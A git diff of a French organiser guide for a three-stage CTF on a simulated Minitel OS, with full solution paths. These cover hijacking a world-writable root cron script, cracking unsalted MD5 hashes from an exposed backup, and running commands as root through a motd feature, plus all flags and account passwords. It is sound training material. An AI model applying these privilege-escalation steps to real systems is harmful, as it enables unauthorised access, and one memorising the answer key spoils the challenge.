@@ -1,7 +1,11 @@
 # MinitelOS CTF — Guide des Challenges
 
-Trois challenges d'exploitation jouables sur terminal Minitel (ou simulateur natif).
-Chaque challenge est indépendant. Les participants reçoivent une **fiche papier** avec le login de départ et des indices progressifs.
+Créneau : **15 minutes** par équipe pour enchaîner les 3 challenges.
+Chaque challenge pivote vers le suivant — il n'y a qu'une seule session de jeu.
+
+```
+stagiaire/1234 → [C1 cron] → user/linux → [C2 backup] → admin/minitel → [C3 motd] → FLAG final
+```
 
 ---
 
@@ -26,7 +30,7 @@ git checkout ctf/scenario-3-backdoor-cron
 # Compiler
 pio run -e native
 
-# Lancer (CTF_MODE actif : reset automatique au démarrage)
+# Lancer — CTF_MODE actif : reset complet au démarrage
 .pio/build/native/program
 ```
 
@@ -43,8 +47,7 @@ pio run -e MinitelOS -t uploadfs
 pio device monitor
 ```
 
-> `CTF_MODE` est activé dans les deux envs par défaut (`platformio.ini`).
-> Au boot, tous les fichiers CTF sont recréés et les artefacts des sessions précédentes supprimés.
+> Au boot, `CTF_MODE` recrée tous les fichiers CTF et supprime les artefacts des sessions précédentes.
 
 ---
 
@@ -53,23 +56,14 @@ pio device monitor
 ### Simulateur
 
 ```bash
-# Option A — reset complet (recommandé)
 rm -rf sim_fs/ && .pio/build/native/program
-
-# Option B — reset partiel (plus rapide, conserve l'arborescence)
-git checkout -- sim_fs/
-rm -f sim_fs/tmp/loot.txt sim_fs/tmp/d_flag.txt sim_fs/home/user/motd_perso.txt
-.pio/build/native/program
 ```
-
-> Les deux options sont équivalentes : `CTF_MODE` recrée tout au démarrage.
 
 ### ESP32
 
 ```bash
-# Simple reboot (CTF_MODE recrée tout au démarrage)
-# Via bouton RESET de la carte, ou :
-pio run -e MinitelOS -t upload   # reflash complet si nécessaire
+# Simple reboot (bouton RESET sur la carte)
+# — CTF_MODE recrée tout au démarrage automatiquement
 ```
 
 ---
@@ -78,13 +72,13 @@ pio run -e MinitelOS -t upload   # reflash complet si nécessaire
 
 | Paramètre | Emplacement | Valeur par défaut |
 |-----------|-------------|-------------------|
-| Durée CTF | `sim_fs/root/.ctf_config` | `720` (12 min) |
+| Durée CTF | `sim_fs/root/.ctf_config` | `900` (15 min) |
 | Intervalle cron | `sim_fs/root/.crontab` | `30` (secondes) |
 | Activer CTF_MODE | `platformio.ini` → `build_flags` | `-D CTF_MODE` |
 
-**Ajuster la durée** (ex. 10 min) :
+**Ajuster la durée** (ex. 12 min) :
 ```bash
-echo "600" > sim_fs/root/.ctf_config
+echo "720" > sim_fs/root/.ctf_config
 ```
 
 **Accélérer le cron pour démo** (5s au lieu de 30s) :
@@ -99,21 +93,11 @@ echo "600" > sim_fs/root/.ctf_config
 
 ---
 
-## Informations communes
-
-| Élément | Valeur |
-|---------|--------|
-| Branche git | `ctf/scenario-3-backdoor-cron` |
-| Timer | commande `ctftime` — durée dans `/root/.ctf_config` |
-| Soumission | Flag à rentrer sur la plateforme web CTF |
-
----
-
 ## Challenge 1 — La Backdoor Cron
 
 **Difficulté** : ⭐⭐ Intermédiaire
-**Durée recommandée** : 12 min
-**Catégorie** : Privilege escalation via cron mal sécurisé
+**Durée recommandée** : 5 min
+**Pivot** : stagiaire → **user**
 
 ### Accès de départ
 
@@ -124,92 +108,87 @@ Password : 1234
 
 ### Objectif
 
-Devenir root et lire `/root/flag.txt`.
+Exploiter le cron world-writable pour lire `/root/flag1.txt` et obtenir les credentials du compte suivant.
 
 ### Chemin de résolution
 
 ```
 1. ps
-   → Voir : [1] 30s run /tmp/maintenance.msh
+   → [2] 30s run /tmp/maintenance.msh  (root)
 
 2. cat /tmp/maintenance.msh
-   → Script légitime, tourne toutes les 30s en ROOT
+   → Script légitime, world-writable
 
 3. edit /tmp/maintenance.msh
-   → Injecter : cat /root/flag.txt > /tmp/loot.txt
+   → Injecter : cat /root/flag1.txt > /tmp/loot.txt
 
 4. (attendre ~30 secondes)
 
 5. cat /tmp/loot.txt
-   → FLAG{cr0n_b4ckd00r_w4s_h3r3}
+   → FLAG{cr0n_2_p1v0t}
+
+6. cat /tmp/users.bak
+   → user:e206a54e97690cce50cc872dd70ee896:user
+
+7. Craquer le hash MD5 de user (wordlist C1)
+   → "linux"
+
+8. su user  →  password : linux
 ```
 
-### Indices papier (à donner progressivement)
+### Indices papier (progressifs)
 
 1. *"Un processus tourne en arrière-plan en tant que root..."*
-2. *"Le script de maintenance est dans /tmp. Qui peut modifier des fichiers dans /tmp ?"*
+2. *"Le script de maintenance est dans /tmp. Qui peut le modifier ?"*
 3. *"Vous pouvez écrire dans le script. Que se passe-t-il si vous y mettez une commande ?"*
 
-### Mécanique exploitée
+### Wordlist C1
 
-Script world-writable exécuté périodiquement par root (cron privilege escalation).
-Équivalent réel : cron jobs avec chemins non protégés (CVE classique Unix).
+```
+minitel  password  linux  1234  telmini  root  azerty
+```
 
 ---
 
 ## Challenge 2 — Le Backup Oublié
 
 **Difficulté** : ⭐ Débutant/Intermédiaire
-**Durée recommandée** : 10 min
-**Catégorie** : Credential exposure + hash cracking + lateral movement
+**Durée recommandée** : 4 min
+**Pivot** : user → **admin**
 
 ### Accès de départ
 
-```
-Login    : user
-Password : 1234
-```
+Credentials obtenus à la fin de C1 (`su user` / `linux`).
 
 ### Objectif
 
-Devenir root en deux étapes (user → admin → root) et lire `/root/flag_a.txt`.
+Cracker le hash admin depuis le backup exposé, devenir admin, lire `/home/admin/flag2.txt`.
 
 ### Chemin de résolution
 
 ```
 1. cat TODO.txt
-   → "rappeler l'admin de supprimer l'ancien backup dans /tmp"
+   → "rappeler l'admin de supprimer le backup dans /tmp"
 
-2. cd /tmp && cat users.bak
-   → Fichier de comptes : admin:bb3c3e98175d33c8300fbb0e84bf9e9f:admin
+2. cat /tmp/users.bak
+   → admin:bb3c3e98175d33c8300fbb0e84bf9e9f:admin
 
-3. Craquer le hash MD5 de admin
-   → Wordlist fournie sur fiche papier : [minitel, password, admin, 1234, telmini]
-   → Résultat : "minitel"
+3. Craquer le hash MD5 de admin (wordlist C2)
+   → "minitel"
 
 4. su admin  →  password : minitel
 
-5. cat notes_perso.txt
-   → "root : T3lm1n1"
-
-6. su root  →  password : T3lm1n1
-
-7. cat /root/flag_a.txt
-   → FLAG{b4ckup_3xp0s3d_4dm1n}
+5. cat flag2.txt
+   → FLAG{4dm1n_4cc3ss}
 ```
 
-### Indices papier (à donner progressivement)
+### Indices papier (progressifs)
 
 1. *"Il y a des fichiers intéressants dans /tmp..."*
-2. *"Le format du fichier de comptes est user:MD5(password):niveau"*
-3. *"L'admin a les mêmes mauvaises habitudes pour tous ses mots de passe..."*
+2. *"Le format est user:MD5(password):niveau"*
+3. *"L'admin a de mauvaises habitudes de mot de passe..."*
 
-### Mécanique exploitée
-
-Backup de base d'utilisateurs laissé dans un répertoire world-accessible.
-MD5 non salé crackable par dictionnaire. Credentials root en clair dans les notes.
-
-### Wordlist à distribuer sur fiche
+### Wordlist C2
 
 ```
 minitel  password  admin  1234  telmini  root  azerty  qwerty
@@ -220,59 +199,50 @@ minitel  password  admin  1234  telmini  root  azerty  qwerty
 ## Challenge 3 — L'Éditeur Piégé
 
 **Difficulté** : ⭐⭐⭐ Avancé
-**Durée recommandée** : 15 min
-**Catégorie** : Code injection via fonctionnalité vulnérable (logic bug)
+**Durée recommandée** : 6 min
+**Pivot** : admin → **root** (exécution)
 
 ### Accès de départ
 
-```
-Login    : user
-Password : 1234
-```
+Credentials obtenus à la fin de C2 (`su admin` / `minitel`).
 
 ### Objectif
 
-Exploiter une vulnérabilité dans la commande `motd` pour exécuter du code en root,
-sans jamais connaître le mot de passe root. Lire `/root/flag_d.txt`.
+Exploiter la fonctionnalité `motd` qui exécute les commandes en root pour lire `/root/flag3.txt` — sans jamais connaître le mot de passe root.
 
 ### Chemin de résolution
 
 ```
 1. cat README.txt
-   → "Créez motd_perso.txt — les commandes shell sont exécutées automatiquement"
+   → "Les commandes shell sont exécutées en tant que SYSTEME
+      pour afficher des informations dynamiques"
 
 2. edit motd_perso.txt
-   → Écrire : cat /root/flag_d.txt > /tmp/d_flag.txt
+   → Écrire : cat /root/flag3.txt > /tmp/pwned.txt
+   → Sauvegarder (w)
 
 3. motd
-   → La commande lit motd_perso.txt et l'exécute EN ROOT (bug d'implémentation)
-   → /tmp/d_flag.txt est créé
+   → Exécute motd_perso.txt EN ROOT (bug d'implémentation)
 
-4. cat /tmp/d_flag.txt
-   → FLAG{m0td_c0d3_3x3c_ft_w}
+4. cat /tmp/pwned.txt
+   → FLAG{r00t_m0td_pwn3d}
 ```
 
-### Indices papier (à donner progressivement)
+### Indices papier (progressifs)
 
 1. *"Lisez attentivement votre répertoire personnel..."*
-2. *"La fonctionnalité de motd personnalisé exécute les commandes. Dans quel contexte ?"*
+2. *"La commande motd exécute les commandes. Dans quel contexte ?"*
 3. *"Une commande qui 'redirige' vers /tmp peut créer un fichier lisible par tous."*
-
-### Mécanique exploitée
-
-La commande `motd` élève les privilèges en root pour "afficher des infos système dynamiques"
-puis exécute les lignes du fichier utilisateur sans restriction.
-Équivalent réel : scripts SUID mal implémentés, plugins exécutés en root.
 
 ---
 
 ## Tableau récapitulatif
 
-| # | Nom | Login départ | Flag | Difficulté | Temps |
-|---|-----|-------------|------|-----------|-------|
-| 1 | Backdoor Cron | stagiaire / 1234 | `FLAG{cr0n_b4ckd00r_w4s_h3r3}` | ⭐⭐ | 12 min |
-| 2 | Backup Oublié | user / 1234 | `FLAG{b4ckup_3xp0s3d_4dm1n}` | ⭐ | 10 min |
-| 3 | Éditeur Piégé | user / 1234 | `FLAG{m0td_c0d3_3x3c_ft_w}` | ⭐⭐⭐ | 15 min |
+| # | Pivot | Login départ | Flag | Durée |
+|---|-------|-------------|------|-------|
+| 1 | stagiaire → user | stagiaire / 1234 | `FLAG{cr0n_2_p1v0t}` | ~5 min |
+| 2 | user → admin | user / linux | `FLAG{4dm1n_4cc3ss}` | ~4 min |
+| 3 | admin → root exec | admin / minitel | `FLAG{r00t_m0td_pwn3d}` | ~6 min |
 
 ---
 
@@ -280,45 +250,49 @@ puis exécute les lignes du fichier utilisateur sans restriction.
 
 ```
 sim_fs/
-├── .motd                        # Bannière CTF affichée à la connexion
+├── .motd                        # Bannière CTF
 ├── home/
-│   ├── stagiaire/               # Home du joueur — Challenge 1
-│   │   └── note.txt             # Indice : "droits mal configurés"
-│   ├── user/                    # Home du joueur — Challenges 2 & 3
-│   │   ├── TODO.txt             # Indice C2 : "backup dans /tmp"
-│   │   └── README.txt           # Indice C3 : "motd supporte les commandes"
-│   └── admin/                   # Home admin — accessible après su admin (C2)
-│       └── notes_perso.txt      # Mot de passe root en clair
+│   ├── stagiaire/
+│   │   └── note.txt             # Indice C1 : droits mal configurés
+│   ├── user/
+│   │   └── TODO.txt             # Indice C2 : backup dans /tmp
+│   └── admin/
+│       ├── flag2.txt            # FLAG Challenge 2 (admin only)
+│       ├── notes_perso.txt      # Infos admin (hint motd)
+│       └── README.txt           # Indice C3 : motd exécute en root
 ├── root/                        # Accessible root uniquement
 │   ├── .users                   # Base de comptes (MD5)
 │   ├── .crontab                 # Tâche cron : 30s run /tmp/maintenance.msh
-│   ├── .ctf_config              # Durée CTF en secondes (720 = 12 min)
-│   ├── .fsmeta                  # Permissions : maintenance.msh = rwxrwxrwx
-│   ├── flag.txt                 # FLAG Challenge 1
-│   ├── flag_a.txt               # FLAG Challenge 2
-│   └── flag_d.txt               # FLAG Challenge 3
+│   ├── .ctf_config              # Durée CTF en secondes (900 = 15 min)
+│   ├── .fsmeta                  # Permissions fichiers
+│   ├── flag1.txt                # FLAG Challenge 1
+│   └── flag3.txt                # FLAG Challenge 3
 └── tmp/                         # World-accessible
-    ├── maintenance.msh          # Script cron légitime (world-writable — C1)
+    ├── maintenance.msh          # Script cron world-writable (vecteur C1)
     ├── maintenance.log          # Log d'exécution
-    └── users.bak                # Backup de comptes exposé (C2)
+    └── users.bak                # Backup comptes exposé (vecteur C2)
 ```
 
 ---
 
 ## Comptes utilisateurs
 
-| User | Password | Level | Rôle |
-|------|----------|-------|------|
-| `root` | T3lm1n1 | root | Admin système (flag caché) |
-| `stagiaire` | 1234 | user | Joueur — Challenge 1 |
-| `user` | 1234 | user | Joueur — Challenges 2 & 3 |
-| `admin` | minitel | admin | Pivot — Challenge 2 |
+| User | Password | Level | Obtenu |
+|------|----------|-------|--------|
+| `stagiaire` | 1234 | user | Donné sur fiche papier |
+| `user` | linux | user | Cracké via C1 (hash dans users.bak) |
+| `admin` | minitel | admin | Cracké via C2 (hash dans users.bak) |
+| `root` | T3lm1n1 | root | Jamais nécessaire — C3 bypasse le password |
 
 ---
 
 ## Notes organisateur
 
-- **Rotation entre équipes** : `git checkout -- sim_fs/ && rm -f sim_fs/tmp/loot.txt sim_fs/tmp/d_flag.txt`
-- **Ajuster le timer** : modifier `sim_fs/root/.ctf_config` (valeur en secondes)
-- **Mode silencieux** : la commande `ctftime` est accessible à tous — les équipes peuvent consulter le temps restant à tout moment
-- **Cron interval** : modifiable dans `sim_fs/root/.crontab` (valeur en secondes) — mettre `5` pour les démos rapides
+- **Reset entre équipes** : `rm -rf sim_fs/ && .pio/build/native/program` (simulateur) ou reboot ESP32
+- **Ajuster le timer** : modifier `sim_fs/root/.ctf_config` (secondes)
+- **Cron démo rapide** : mettre `5` dans `.crontab` au lieu de `30`
+- **Vérifier la progression** : `ctftime` affiche le temps restant à tout moment
+- **Artefacts à nettoyer** (gérés automatiquement par CTF_MODE au boot) :
+  - `/tmp/loot.txt` — flag C1
+  - `/tmp/pwned.txt` — flag C3
+  - `/home/admin/motd_perso.txt` — injection C3
